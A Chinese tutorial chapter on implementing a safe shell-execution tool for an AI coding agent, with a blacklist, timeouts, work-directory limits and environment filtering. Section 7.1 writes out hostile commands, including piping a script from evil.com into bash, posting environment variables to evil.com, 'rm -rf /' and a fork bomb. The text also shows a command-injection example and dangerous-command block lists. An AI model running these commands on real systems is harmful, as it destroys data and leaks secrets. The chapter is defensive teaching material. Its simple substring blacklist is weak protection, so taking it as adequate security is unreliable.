# 第 7 章：Shell 执行

如果文件操作是 Agent 的"手"，那么 Shell 执行就是 Agent 的"超能力"。

它可以：
- 🏃 运行测试：`pytest tests/`
- 📦 安装依赖：`pip install requests`
- 🔧 执行构建：`npm run build`
- 📊 查看系统信息：`git status`

但同时，它也是**最危险**的工具——一个错误的命令可能删除整个项目！

在这一章，我们将学习如何安全地实现 Shell 执行工具。

## 7.1 危险性评估

### 让我们看看能用 Shell 做什么坏事

```bash
# 删除所有文件
rm -rf /

# 下载并执行恶意脚本
curl http://evil.com/hack.sh | bash

# 窃取环境变量
env | curl -X POST http://evil.com/steal

# 创建死循环
:(){ :|:& };:
```

可怕吧？所以我们需要非常小心。

##7.2 安全原则

在实现 Shell 工具之前，让我们定义安全原则：

### 原则 1：绝不以 root 运行

```python
# ❌ 危险
subprocess.run("rm -rf /", shell=True)

# ✅ 安全：检查用户权限
import os
if os.geteuid() == 0:
    raise SecurityError("不能以 root 用户运行!")
```

### 原则 2：工作目录隔离

```python
# ❌ 危险：在任意目录执行
subprocess.run(command, cwd="/")

# ✅ 安全：限制在项目目录
subprocess.run(command, cwd=project_dir)
```

### 原则 3：超时控制

```python
# ❌ 危险：可能永久挂起
subprocess.run(command)

# ✅ 安全：设置超时
subprocess.run(command, timeout=30)
```

### 原则 4：禁止危险命令

```python
DANGEROUS_COMMANDS = [
    "rm -rf /",
    "dd if=/dev/zero",
    "mkfs",
    ":(){ :|:& };:",  # fork bomb
]

def is_dangerous(command: str) -> bool:
    return any(danger in command for danger in DANGEROUS_COMMANDS)
```

## 7.3 实现 Shell 工具

### 第一个版本：基础实现

```python
# tools/shell_v1.py

import subprocess
from pydantic import BaseModel, Field

class ShellParams(BaseModel):
    command: str = Field(description="要执行的 shell 命令")

async def execute_shell(params: ShellParams) -> str:
    """执行 shell 命令"""

    try:
        result = subprocess.run(
            params.command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30  # 30 秒超时
        )

        output = result.stdout
        if result.stderr:
            output += f"\n[stderr]\n{result.stderr}"

        return output

    except subprocess.TimeoutExpired:
        return "❌ 命令执行超时（30秒）"
    except Exception as e:
        return f"❌ 执行失败: {e}"
```

### 问题：shell=True 很危险！

`shell=True` 会启动一个完整的 shell，容易受到**命令注入**攻击：

```python
# 用户输入
user_input = "test.txt; rm -rf /"

# 构造命令
command = f"cat {user_input}"

# 执行
subprocess.run(command, shell=True)
# 实际执行: cat test.txt; rm -rf /
# 💥 灾难！
```

### 第二个版本：更安全的实现

```python
# tools/shell_v2.py

import subprocess
import shlex
from pathlib import Path
from pydantic import BaseModel, Field

class ShellParams(BaseModel):
    command: str = Field(description="要执行的命令")
    timeout: int = Field(60, description="超时时间（秒）")

class ShellTool:
    """Shell 执行工具"""

    # 危险命令黑名单
    DANGEROUS_PATTERNS = [
        "rm -rf /",
        "mkfs",
        "dd if=/dev",
        ":(){",  # fork bomb
        "sudo",
        "su -",
        "chmod 777",
        "curl | bash",
        "wget | bash",
    ]

    def __init__(self, work_dir: Path, max_timeout: int = 300):
        """
        Args:
            work_dir: 工作目录
            max_timeout: 最大超时时间（秒）
        """
        self.work_dir = work_dir
        self.max_timeout = max_timeout

    def _is_dangerous(self, command: str) -> tuple[bool, str]:
        """检查命令是否危险

        Returns:
            (是否危险, 原因)
        """
        for pattern in self.DANGEROUS_PATTERNS:
            if pattern in command.lower():
                return True, f"包含危险模式: {pattern}"

        return False, ""

    async def execute(self, params: ShellParams) -> str:
        """执行 shell 命令"""

        # 1. 安全检查
        is_dangerous, reason = self._is_dangerous(params.command)
        if is_dangerous:
            return f"❌ 拒绝执行危险命令: {reason}\n命令: {params.command}"

        # 2. 检查超时设置
        timeout = min(params.timeout, self.max_timeout)

        # 3. 执行命令
        try:
            result = subprocess.run(
                params.command,
                shell=True,  # 仍然需要 shell，但加了安全检查
                cwd=self.work_dir,  # 限制在工作目录
                capture_output=True,
                text=True,
                timeout=timeout,
                env=self._get_safe_env()  # 使用安全的环境变量
            )

            # 4. 格式化输出
            output = self._format_output(
                command=params.command,
                return_code=result.returncode,
                stdout=result.stdout,
                stderr=result.stderr
            )

            return output

        except subprocess.TimeoutExpired:
            return f"❌ 命令超时（{timeout}秒）\n命令: {params.command}"

        except Exception as e:
            return f"❌ 执行失败: {e}\n命令: {params.command}"

    def _get_safe_env(self) -> dict:
        """获取安全的环境变量"""
        import os

        # 复制当前环境，但移除敏感信息
        env = os.environ.copy()

        # 移除可能的密钥
        sensitive_keys = [
            'AWS_SECRET_ACCESS_KEY',
            'GITHUB_TOKEN',
            # 可以添加更多
        ]

        for key in sensitive_keys:
            env.pop(key, None)

        return env

    def _format_output(
        self,
        command: str,
        return_code: int,
        stdout: str,
        stderr: str
    ) -> str:
        """格式化命令输出"""

        lines = []
        lines.append(f"$ {command}")
        lines.append("")

        if stdout:
            lines.append(stdout.rstrip())

        if stderr:
            lines.append("")
            lines.append("[stderr]")
            lines.append(stderr.rstrip())

        lines.append("")
        if return_code == 0:
            lines.append("✅ 执行成功")
        else:
            lines.append(f"❌ 退出码: {return_code}")

        return "\n".join(lines)
```

## 7.4 实战示例

### 示例 1：运行测试

```python
result = await shell_tool.execute(ShellParams(
    command="pytest tests/ -v"
))
```

输出：

```
$ pytest tests/ -v

============================= test session starts =============================
tests/test_agent.py::test_basic_run PASSED                               [ 33%]
tests/test_tools.py::test_read_file PASSED                               [ 66%]
tests/test_tools.py::test_write_file PASSED                              [100%]

============================== 3 passed in 1.23s ===============================

✅ 执行成功
```

### 示例 2：安装依赖

```python
result = await shell_tool.execute(ShellParams(
    command="pip install requests"
))
```

### 示例 3：Git 操作

```python
# 查看状态
await shell_tool.execute(ShellParams(command="git status"))

# 创建提交
await shell_tool.execute(ShellParams(command="git add . && git commit -m 'fix: bug'"))
```

## 7.5 高级特性：后台执行

有些命令需要长时间运行（如启动服务器），我们不希望阻塞 Agent。

### 实现后台执行

```python
import asyncio

class ShellTool:
    def __init__(self, ...):
        self.background_processes = {}  # 后台进程字典

    async def execute_background(self, params: ShellParams) -> str:
        """后台执行命令"""

        process = await asyncio.create_subprocess_shell(
            params.command,
            cwd=self.work_dir,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # 生成进程 ID
        process_id = f"bg_{len(self.background_processes) + 1}"
        self.background_processes[process_id] = process

        return f"✅ 后台进程已启动\n" \
               f"   进程 ID: {process_id}\n" \
               f"   命令: {params.command}\n" \
               f"\n" \
               f"使用 check_background('{process_id}') 查看状态"

    async def check_background(self, process_id: str) -> str:
        """检查后台进程"""

        if process_id not in self.background_processes:
            return f"❌ 未找到进程: {process_id}"

        process = self.background_processes[process_id]

        if process.returncode is None:
            # 仍在运行
            return f"⏳ 进程 {process_id} 仍在运行"
        else:
            # 已完成
            stdout = await process.stdout.read()
            stderr = await process.stderr.read()

            result = f"✅ 进程 {process_id} 已完成\n"
            result += f"退出码: {process.returncode}\n\n"

            if stdout:
                result += stdout.decode()
            if stderr:
                result += f"\n[stderr]\n{stderr.decode()}"

            return result

    async def kill_background(self, process_id: str) -> str:
        """终止后台进程"""

        if process_id not in self.background_processes:
            return f"❌ 未找到进程: {process_id}"

        process = self.background_processes[process_id]

        if process.returncode is not None:
            return f"进程 {process_id} 已经结束"

        process.kill()
        await process.wait()

        return f"✅ 已终止进程 {process_id}"
```

### 使用后台执行

```python
# 启动开发服务器
result = await shell_tool.execute_background(ShellParams(
    command="python -m http.server 8000"
))
# 输出: ✅ 后台进程已启动, 进程 ID: bg_1

# 做其他事情...

# 检查状态
status = await shell_tool.check_background("bg_1")
# 输出: ⏳ 进程 bg_1 仍在运行

# 完成后终止
result = await shell_tool.kill_background("bg_1")
# 输出: ✅ 已终止进程 bg_1
```

## 7.6 Agent 如何使用 Shell

让我们看一个完整的例子——Agent 帮你创建一个 Python 项目：

```
用户: 创建一个新的 Python 项目 my-app，包含测试

Agent 的执行流程:

1. 创建目录结构
   shell("mkdir -p my-app/src/my_app my-app/tests")

2. 创建 pyproject.toml
   write_file("my-app/pyproject.toml", content=...)

3. 创建主文件
   write_file("my-app/src/my_app/__init__.py", ...)
   write_file("my-app/src/my_app/main.py", ...)

4. 创建测试文件
   write_file("my-app/tests/test_main.py", ...)

5. 初始化 Git
   shell("cd my-app && git init")

6. 安装依赖
   shell("cd my-app && pip install -e .")

7. 运行测试验证
   shell("cd my-app && pytest")

8. 完成！
   "✅ 项目 my-app 创建成功！运行 'cd my-app' 进入项目。"
```

## 7.7 安全清单

在部署 Shell 工具到生产环境前，检查这个清单：

- [ ] ✅ 有危险命令黑名单
- [ ] ✅ 有超时设置（默认和最大值）
- [ ] ✅ 工作目录限制
- [ ] ✅ 不以 root 运行
- [ ] ✅ 环境变量过滤
- [ ] ✅ 输出日志记录
- [ ] ✅ 错误处理完善
- [ ] ⭐ 用户确认机制（下一章）
- [ ] ⭐ 审计日志（记录所有执行的命令）

## 7.8 小结

Shell 执行是 Agent 最强大的工具，但也最危险。在这一章，我们学习了：

- ✅ **危险性认知**：了解 Shell 能造成的破坏
- ✅ **安全原则**：隔离、超时、黑名单、权限控制
- ✅ **完整实现**：包含安全检查的 Shell 工具
- ✅ **后台执行**：运行长时间任务
- ✅ **实战应用**：Agent 如何组合使用 Shell

记住：**能力越大，责任越大。** Shell 工具必须谨慎设计和使用。

在下一章，我们将学习**审批系统**——在执行危险操作前先问问用户！

---

**上一章**：[第 6 章：文件操作工具](./06-file-tools.md) ←
**下一章**：[第 8 章：审批系统](./08-approval-system.md) →
